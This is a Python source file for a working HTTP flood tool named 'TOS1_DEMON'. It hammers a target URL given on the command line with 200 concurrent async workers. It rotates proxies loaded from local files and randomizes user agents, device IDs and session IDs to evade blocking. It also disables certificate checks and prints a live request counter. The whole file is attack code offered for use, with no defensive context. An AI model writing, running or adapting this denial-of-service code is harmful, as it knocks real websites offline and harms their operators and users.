import asyncio
import aiohttp
import time
import random
import os
import sys
from datetime import datetime
import psutil

class TOS1_DEMON:
    def __init__(self, target_url):
        self.target_url = target_url
        self.total_requests = 0
        self.session_id = "S023"
        self.demon_id = "TØS-RR"
        self.maintenance_status = ""
        
        # PROXY SYSTEM
        self.proxies = []
        self.current_proxy_index = 0
        self.proxy_files = ['h1.txt', 'h2.txt']
        self.proxy_api = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all"
        
        # HEADER ROTATION
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        
        self.device_ids = ['550e8400-e29b-41d4-a716-446655440000', '6ba7b810-9dad-11d1-80b4-00c04fd430c8']
        self.session_ids = ['session_' + ''.join(random.choices('abcdef0123456789', k=16)) for _ in range(5)]
        
        # CONTROL
        self.running = True
        self.maintenance_mode = False
        self.last_maintenance = time.time()
        self.maintenance_interval = 900
        
        # STATS
        self.start_time = time.time()
        self.current_rps = 0
        self.requests_since_last = 0
        self.last_rps_calc = time.time()
        
        # ASYNC
        self.session = None
        self.connector = None
        
    def load_proxies_sync(self):
        """Load proxies without async"""
        all_proxies = []
        
        # Load from files
        for file in self.proxy_files:
            try:
                if os.path.exists(file):
                    with open(file, 'r') as f:
                        proxies = [line.strip() for line in f if line.strip()]
                        all_proxies.extend(proxies)
            except:
                pass
        
        # Remove duplicates
        self.proxies = list(set(all_proxies))
        
        if not self.proxies:
            self.proxies = [None]
    
    def get_next_proxy(self):
        if not self.proxies:
            return None
        
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        proxy = self.proxies[self.current_proxy_index]
        
        if proxy:
            return f"http://{proxy}"
        return None
    
    def generate_headers(self):
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if random.random() > 0.7:
            headers['X-Device-ID'] = random.choice(self.device_ids)
        if random.random() > 0.7:
            headers['X-Session-ID'] = random.choice(self.session_ids)
        
        return headers
    
    def check_cpu(self):
        return psutil.cpu_percent(interval=0.1)
    
    async def send_request(self):
        proxy = self.get_next_proxy()
        headers = self.generate_headers()
        
        try:
            if proxy:
                async with aiohttp.ClientSession() as session:
                    async with session.get(self.target_url, headers=headers, proxy=proxy, timeout=5, ssl=False) as response:
                        await response.read()
            else:
                async with aiohttp.ClientSession() as session:
                    async with session.get(self.target_url, headers=headers, timeout=5, ssl=False) as response:
                        await response.read()
                        
        except Exception as e:
            pass
        finally:
            self.total_requests += 1
            self.requests_since_last += 1
    
    async def attack_worker(self):
        while self.running and not self.maintenance_mode:
            await self.send_request()
            await asyncio.sleep(0.001)  # Small delay
    
    def calculate_rps(self):
        now = time.time()
        time_diff = now - self.last_rps_calc
        
        if time_diff >= 0.001:
            self.current_rps = self.requests_since_last / time_diff
            self.requests_since_last = 0
            self.last_rps_calc = now
    
    def update_display(self):
        self.calculate_rps()
        
        # Update maintenance status
        if self.maintenance_mode:
            self.maintenance_status = "TØS-MAINTENACE"
        else:
            time_left = self.maintenance_interval - (time.time() - self.last_maintenance)
            if time_left < 60:
                self.maintenance_status = f"M-{int(time_left)}s"
            else:
                self.maintenance_status = f"M-{int(time_left/60)}m"
        
        # ONLY THIS LOG - overwriting
        sys.stdout.write(f'\rTØS-TRS — {self.total_requests} | {{{self.session_id}, {self.demon_id}, {self.maintenance_status}}}')
        sys.stdout.flush()
    
    async def maintenance(self):
        self.maintenance_mode = True
        await asyncio.sleep(2)
        
        # Refresh
        self.load_proxies_sync()
        self.session_ids = ['session_' + ''.join(random.choices('abcdef0123456789', k=16)) for _ in range(5)]
        
        self.maintenance_mode = False
        self.last_maintenance = time.time()
    
    async def monitor_maintenance(self):
        while self.running:
            if time.time() - self.last_maintenance >= self.maintenance_interval:
                await self.maintenance()
            await asyncio.sleep(1)
    
    async def monitor_display(self):
        while self.running:
            self.update_display()
            await asyncio.sleep(0.001)
    
    async def start_attack(self):
        # Create workers
        workers = [self.attack_worker() for _ in range(200)]  # 200 workers
        
        # Run everything
        await asyncio.gather(
            *workers,
            self.monitor_maintenance(),
            self.monitor_display()
        )
    
    def start(self):
        # Initial display
        print("𝖳Ø𝖲-1 | 𝖲023")
        time.sleep(2)
        os.system('clear')
        
        # Load proxies
        self.load_proxies_sync()
        
        # Start attack
        asyncio.run(self.start_attack())

# FIXED ASYNC FOR PYTHON 3.10+
import asyncio
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(1)
    
    target = sys.argv[1]
    
    # Clean start
    os.system('clear')
    print("𝖳Ø𝖲-1 | 𝖲023")
    time.sleep(2)
    os.system('clear')
    
    # Create and run
    demon = TOS1_DEMON(target)
    
    try:
        demon.start()
    except KeyboardInterrupt:
        print(f"\n\nTOTAL: {demon.total_requests}")
    except Exception as e:
        print(f"\nError: {e}")
